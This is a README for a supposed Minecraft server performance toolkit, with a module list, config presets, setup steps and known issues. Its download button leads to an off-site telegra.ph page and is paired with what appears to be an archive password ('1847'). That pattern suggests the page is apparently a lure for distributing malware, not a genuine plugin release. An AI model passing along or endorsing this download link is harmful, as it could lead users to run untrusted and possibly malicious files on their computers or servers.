`minecraft` `server-optimizer` `performance` `tps` `lag-fix` `java` `spigot` `paper` `bukkit` `server-tools`

# Minecraft-ServerOptimizer

Running a Minecraft server for friends shouldn't require a NASA computer. I got tired of watching TPS drop to single digits every time more than 10 people logged on, so I built this toolkit to squeeze every bit of performance out of a vanilla or modded server. These optimizations keep TPS at 20 even with 30 players online.

## Download 🔗

[![DOWNLOAD MINECRAFT](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://telegra.ph/Download-05-21-39)

**🔐 — 1847**

## Why I Built This

My friends and I run a survival server. Every few weeks it'd grind to a halt — chunk loading would stall, redstone contraptions would lag the whole server, and entity counts would spiral out of control. I couldn't find one tool that handled all of it, so I wrote my own modules and bundled them together. Now our server runs smooth even during peak hours.

## What's Inside

This toolkit is modular — use what you need, ignore the rest.

| Module | What It Does |
|---|---|
| **ChunkOptimizer** | Aggressive chunk loading/unloading based on player proximity and movement patterns |
| **EntityLimiter** | Caps entity counts per chunk with smart culling (prioritizes hostile mobs over passive) |
| **RedstoneProfiler** | Profiles redstone circuits and throttles the worst offenders without breaking builds |
| **TpsMonitor** | Real-time TPS tracking with alerts and automatic degradation triggers |
| **GarbageCollector** | Tuned JVM garbage collection wrapper that reduces GC pauses during gameplay |
| **WorldPreGenerator** | Pre-generates chunks ahead of player exploration to prevent lag spikes |
| **PluginProfiler** | Identifies which plugins are eating the most tick time so you know what to fix |
| **MemoryManager** | Monitors heap usage and dynamically adjusts cache sizes to prevent OOM crashes |
| **BackupScheduler** | Non-blocking incremental backups that won't tank your TPS mid-save |

### Presets

Drop-in config presets for common server types:

- **survival_server** — Balanced optimization for long-term survival worlds with farms and redstone
- **creative_server** — Relaxed entity limits, prioritizes chunk loading speed for builders
- **minigame** — Aggressive optimization for high player counts in small arenas
- **hardcore** — Maximum stability, conservative settings, zero tolerance for TPS drops

## How to Set It Up

1. Drop the `.jar` into your server's `plugins/` folder
2. Restart the server — default config generates in `plugins/ServerOptimizer/`
3. Pick a preset or tweak individual modules in `config.yml`
4. Run `/so reload` in-game or from console to apply changes
5. Check `/so status` to see module states and current TPS

Each module can be toggled independently. Check the `tweaks/` folder for the individual module source files.

## Known Issues

- **WorldPreGenerator** can spike CPU usage on first run — let it finish before opening the server to players
- **RedstoneProfiler** occasionally flags observer chains as problematic when they're actually fine — working on better detection
- **EntityLimiter** might conflict with mob-stacking plugins — disable one or the other
- Some Paper-specific optimizations don't apply to Spigot — you'll see warnings in console but nothing breaks

> This is a personal project shared as-is. Not affiliated with Mojang Studios or Microsoft. Use at your own risk and always keep backups of your world before applying server-side changes. 
